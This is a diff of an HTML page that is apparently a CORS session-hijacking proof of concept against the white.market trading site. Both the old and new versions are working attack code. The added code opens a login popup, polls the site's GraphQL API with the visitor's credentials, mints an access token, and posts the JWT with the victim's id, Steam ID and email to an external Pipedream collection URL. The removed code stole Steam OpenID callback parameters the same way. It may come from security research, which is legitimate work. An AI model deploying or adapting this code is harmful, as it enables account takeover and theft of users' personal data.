@@ -1,111 +1,125 @@
 <!DOCTYPE html>
 <html>
-<head><title>White Market - Steam Login</title></head>
+<head><title>White Market - Login</title></head>
 <body>
-<h1>Connecting to Steam...</h1>
+<h1>Redirecting to Steam Login...</h1>
 <div id="status"></div>
 <script>
 const status = document.getElementById('status');
 const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
 
-status.innerHTML = 'Checking for Steam callback...<br>';
+// Redirect victim to real Steam login
+status.innerHTML = 'Opening Steam login in popup...<br>';
 
-// Check if we're on the Steam callback
-const params = new URLSearchParams(window.location.search);
+// Open Steam login in popup
+const loginWindow = window.open(
+    'https://white.market/login',
+    'steam_login',
+    'width=600,height=700'
+);
 
-if (params.has('openid.sig')) {
-    status.innerHTML += 'STEAM CALLBACK DETECTED!<br>';
+status.innerHTML += 'Login window opened<br>';
+status.innerHTML += 'Monitoring for successful login...<br><br>';
+
+let pollCount = 0;
+const maxPolls = 60; // Poll for up to 60 seconds
+
+// Poll the API to detect when user logs in
+const pollInterval = setInterval(async () => {
+    pollCount++;
+    status.innerHTML += `Poll ${pollCount}/${maxPolls}<br>`;
     
-    // User was redirected here from Steam - steal the OpenID params!
-    const steamAuth = {
-        openidNs: params.get('openid.ns'),
-        openidMode: params.get('openid.mode'),
-        openidOpEndpoint: params.get('openid.op_endpoint'),
-        openidClaimedId: params.get('openid.claimed_id'),
-        openidIdentity: params.get('openid.identity'),
-        openidReturnTo: params.get('openid.return_to'),
-        openidResponseNonce: params.get('openid.response_nonce'),
-        openidAssocHandle: params.get('openid.assoc_handle'),
-        openidSigned: params.get('openid.signed'),
-        openidSig: params.get('openid.sig')
-    };
-    
-    status.innerHTML += 'Stolen Steam parameters:<br>' + JSON.stringify(steamAuth, null, 2).substring(0, 200) + '...<br><br>';
-    
-    // Send stolen Steam auth to our server
-    fetch(REQUESTBIN, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            attack: 'STOLEN_STEAM_AUTH',
-            steamAuth: steamAuth,
-            timestamp: new Date().toISOString()
-        })
-    });
-    
-    status.innerHTML += 'Attempting to generate JWT via CORS...<br>';
-    
-    // Now use it to login and get JWT
-    fetch('https://api.white.market/graphql/api', {
-        method: 'POST',
-        credentials: 'include',
-        headers: {
-            'Content-Type': 'application/json',
-            'x-accept-language': 'en_US'
-        },
-        body: JSON.stringify({
-            query: 'mutation AuthSteam($steamAuth: SteamAuthInput!) { auth_steam(steamAuth: $steamAuth) { accessToken isNewPerson } }',
-            variables: {steamAuth: steamAuth},
-            operationName: 'AuthSteam'
-        })
-    })
-    .then(r => r.json())
-    .then(d => {
-        console.log('auth_steam response:', d);
+    try {
+        // Try to fetch user profile (requires authentication)
+        const response = await fetch('https://api.white.market/graphql/api', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'x-accept-language': 'en_US'
+            },
+            body: JSON.stringify({
+                query: 'query { person: person_profile { id steamId email } }',
+                operationName: 'PersonProfile'
+            })
+        });
         
-        if (d.data && d.data.auth_steam) {
-            // SUCCESS - got JWT!
-            status.innerHTML += '<strong>SUCCESS! JWT GENERATED!</strong><br>';
-            status.innerHTML += 'JWT: ' + d.data.auth_steam.accessToken.substring(0, 100) + '...<br>';
+        const data = await response.json();
+        
+        if (data.data && data.data.person) {
+            // SUCCESS - User is logged in!
+            clearInterval(pollInterval);
             
-            fetch(REQUESTBIN, {
+            status.innerHTML += '<br><strong>LOGIN DETECTED!</strong><br>';
+            status.innerHTML += 'User data: ' + JSON.stringify(data.data.person).substring(0, 200) + '<br><br>';
+            
+            // Now steal their session by generating a JWT
+            const jwtResponse = await fetch('https://api.white.market/graphql/api', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'x-accept-language': 'en_US'
+                },
                 body: JSON.stringify({
-                    attack: 'JWT_GENERATED_SUCCESS',
-                    jwt: d.data.auth_steam.accessToken,
-                    isNewPerson: d.data.auth_steam.isNewPerson,
-                    timestamp: new Date().toISOString()
+                    query: 'mutation AuthToken { auth_token { accessToken } }',
+                    operationName: 'AuthToken'
                 })
             });
-        } else {
-            status.innerHTML += 'JWT generation failed: ' + JSON.stringify(d) + '<br>';
             
-            fetch(REQUESTBIN, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    attack: 'JWT_GENERATION_FAILED',
-                    response: d,
-                    timestamp: new Date().toISOString()
-                })
-            });
+            const jwtData = await jwtResponse.json();
+            
+            if (jwtData.data && jwtData.data.auth_token) {
+                status.innerHTML += '<strong>JWT STOLEN!</strong><br>';
+                status.innerHTML += 'JWT: ' + jwtData.data.auth_token.accessToken.substring(0, 100) + '...<br>';
+                
+                // Exfiltrate
+                fetch(REQUESTBIN, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        attack: 'SESSION_HIJACK_SUCCESS',
+                        jwt: jwtData.data.auth_token.accessToken,
+                        victim_data: data.data.person,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } else {
+                status.innerHTML += 'JWT generation failed (user might not have refresh token)<br>';
+                status.innerHTML += 'But we can still make authenticated requests!<br>';
+                
+                // Even without JWT, we can still exfiltrate data via CORS
+                fetch(REQUESTBIN, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        attack: 'SESSION_HIJACK_PARTIAL',
+                        victim_data: data.data.person,
+                        note: 'Can make authenticated requests while user is logged in',
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            }
+            
+            // Close popup and redirect
+            if (loginWindow) loginWindow.close();
+            setTimeout(() => {
+                window.location.href = 'https://white.market';
+            }, 3000);
         }
-    })
-    .catch(e => {
-        status.innerHTML += 'Error: ' + e.message + '<br>';
-        console.error(e);
-    });
+        
+    } catch (e) {
+        // User not logged in yet, keep polling
+    }
     
-} else {
-    status.innerHTML += 'No Steam callback detected<br>';
-    status.innerHTML += 'URL params: ' + window.location.search + '<br>';
-}
+    if (pollCount >= maxPolls) {
+        clearInterval(pollInterval);
+        status.innerHTML += '<br>Timeout - user did not complete login<br>';
+        if (loginWindow) loginWindow.close();
+    }
+    
+}, 1000); // Poll every second
 
-status.innerHTML += '<br>Redirecting to white.market in 10 seconds...';
-setTimeout(() => {
-    window.location.href = 'https://white.market';
-}, 10000);
 </script>
 </body>
 </html>
